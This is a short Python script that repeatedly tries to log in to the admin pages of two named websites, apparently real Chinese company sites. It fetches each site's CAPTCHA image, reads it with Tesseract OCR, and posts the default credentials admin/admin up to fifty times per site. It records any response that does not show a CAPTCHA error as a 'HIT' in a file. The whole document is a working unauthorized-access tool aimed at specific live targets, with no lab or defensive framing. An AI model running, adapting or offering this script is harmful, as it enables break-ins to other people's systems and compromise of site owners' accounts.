import subprocess, time, re
from PIL import Image, ImageFilter
import json, base64

targets = [
    {'name': 'nasonic', 'url': 'http://www.nasonic.com.cn', 'login': '/login.php', 'cap': '/data/include/imagecode.php?act=verifycode', 'post': 'act=login&username=admin&password=admin&valicode={code}&login_btn=login'},
    {'name': 'taiso', 'url': 'http://www.taiso.com.cn', 'login': '/login.php', 'cap': '/data/include/imagecode.php?act=verifycode', 'post': 'act=login&username=admin&password=admin&valicode={code}&login_btn=login'},
]

def ocr(img_path):
    try:
        img = Image.open(img_path)
        img = img.convert('L')
        img = img.resize((img.width*4, img.height*4), Image.LANCZOS)
        img = img.point(lambda x: 0 if x < 140 else 255)
        img.save('/tmp/ocr_prep.png')
        subprocess.run(['tesseract','/tmp/ocr_prep.png','/tmp/ocr_out','-c','tessedit_char_whitelist=0123456789','--psm','7'],timeout=5)
        return open('/tmp/ocr_out.txt').read().strip().replace(' ','')[:6]
    except:
        return '0000'

for t in targets:
    for i in range(50):
        try:
            C = f'/tmp/ocr_{t["name"]}.txt'
            subprocess.run(['curl','-sk','--connect-timeout','6',t['url']+t['login'],'-c',C,'-b',C,'-o','/dev/null'],timeout=8)
            subprocess.run(['curl','-sk','--connect-timeout','6',t['url']+t['cap'],'-b',C,'-o','/tmp/ocr_raw.png'],timeout=8)
            code = ocr('/tmp/ocr_raw.png')
            post = t['post'].replace('{code}', code)
            r = subprocess.run(['curl','-sk','--connect-timeout','6','-L',t['url']+t['login'],'-X','POST','-d',post,'-b',C],capture_output=True,text=True,timeout=8)
            s = 'WRONG'
            if '验证码错误' not in r.stdout and '验证码格式' not in r.stdout and len(r.stdout)>100:
                s = f'HIT: {r.stdout[:200]}'
                open(f'/tmp/{t["name"]}_HIT.txt','w').write(f'code={code}\n{r.stdout[:500]}')
            print(f'{t["name"]}:{i} OCR={code} {s[:60]}',flush=True)
        except Exception as e:
            print(f'{t["name"]}:{i} ERR={e}',flush=True)
        time.sleep(0.3)
